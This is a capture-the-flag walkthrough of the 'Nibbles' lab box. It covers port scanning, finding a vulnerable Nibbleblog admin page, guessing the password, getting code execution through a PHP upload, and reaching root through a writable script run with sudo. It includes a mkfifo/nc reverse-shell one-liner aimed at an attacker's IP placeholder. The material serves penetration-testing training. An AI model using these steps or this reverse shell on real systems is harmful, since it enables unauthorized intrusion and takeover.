# Nibbles Walkthrough
### Enumeration
The first when approaching any machine is to perform some basic enumeration. First, let's start with we do know about the target. We already know the target's IP address, that it is Linux, and has a web-related attack vector.

There are three main types of penetration testing actions, **black-box**, **grey-box**, **white-box**

- *Black-box*: Low level to no knowledge of a target. The penetration tester must perform in-depth reconnaissance to learn about the target. 
- *Grey-box*: In a grey-box test, the tester is given a certain amount of information in advance. This may be a list of in-scope IP addresses/ranges, low-level credentials to a web application or Active Directory, or some application/network diagrams. 
- *White-box*: In this type of test, the tester is given complete access. In a web application test, they may be provided with administrator-level credentials, access to the source code, build diagrams, etc., to look for logic vulnerabilities and other difficult-to-discover flaws.

##### Nmap
Let's do quick `nmap` scan to look for open ports using the command `nmap -sV --open -oA nibbles_initial_scan <ip-addr>`. This will run a service enumeration `sV` against the default top 1,000 ports and only return open ports `--open`. Finally, it outputs all scan formats `-oA`. This includes XML output, greppable output, and text output that may be useful later.

From the initial scan we see that ports 22 OpenSSH server and an Apache web server on port 80.  Before we start poking around at the open ports, we can run a full TCP port scan using the command `nmap -p- --open -oA nibbles_full_tcp_scan $IP`. This may find some ports that we may have missed. Now we can use `nc` to do some banner grabbing and confirm what `nmap` told us.

`nc -nv $IP 22`
and
`nc -nv $IP 80`

Port 22 returns a banner showing that it is indeed an OpenSSH server, however port 80 doesn't return a banner.

The finished `-p-` scan returned no new ports that were open on the machine. Now we can do a `-sC` standard scripts scan on the open ports. We will run the command `nmap -sC -p 22,80 -oA nibbles_script_scan $IP`

The scan did not give us anything handy, so we can wrap up the `nmap` enumeration using the ***http-enum*** script, which can be used to enumerate common web application directories.

### Web Footprinting
Can use `whatweb` to try to identify the web application in use.

`whatweb <ip address>`

There's some interesting content in the source code of the web page. You can also use `curl` on the site using `curl http://<ip address>`

This reveals a HTML comment showing that there exists a directory called */nibbleblog* that we can go to.

##### Directory Enumeration
Browsing to /nibbleblog we don't really see anything here that sticks out. A quick Google search for "nibbleblog exploit" yields a Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The **Metasploit** module in question works for version **4.0.3**. We don't know the exact version number yet of Nibblblog, but it is a good bet that it is vulnerable to it.

We can use `gobuster` tool to find some more directories...
It confirms the prescense of a /admin.php login page. We can check the README page for interesting information, such as the version number of Nibblblog.

In the README we see that the Nibblblog version is ***v.4.03*** which is vulnerable to the vulnerability found earlier. Also poking around other directories such as /content, we find a file called users.xml that shows there is indeed a username called 'admin' and blacklisted IP addresses. We can curl this down and use `xmllint` to prettify it.

`curl http://$IP/nibbleblog/content/private/users.xml | xmllint --format -`

Looking at the *config.xml* file we see some more references to admin and nibbles. Trying out the word *nibbles* yields a successful login for the admin user to the portal.

### Initial Foothold
Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately a reverse shell on the webserver. We know there's a metasploit module for this, but let's try to enumerate the admin portal for other avenues of attack first.

We see that in the plugins section, there's a *my_image* section that allows for you to upload an image. If we upload a PHP script instead, let's see what it does. It gives errors but appears to be uploaded. We find that the script was put in /nibbleblog/content/private/plugins/my_images/*image.php*

Let's see if we have code execution

`curl http://$IP/nibbleblog/content/private/plugins/my_images/image.php`

Now that we see there's code execution, we can use a `Bash` reverse shell one-liner and add it to our PHP script .

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f`

### Privilege Escalation
We see that there is file `personal.zip` and we can unzip it. There is a shell script `monitor.sh` and it is owned by our nibbler user and writeable.

We find that nibbler user can run all sudo without password
We can append the reverse shell to the monitor.sh script and run it with sudo to capture a root reverse shell.


### Alternate User Method - Metasploit

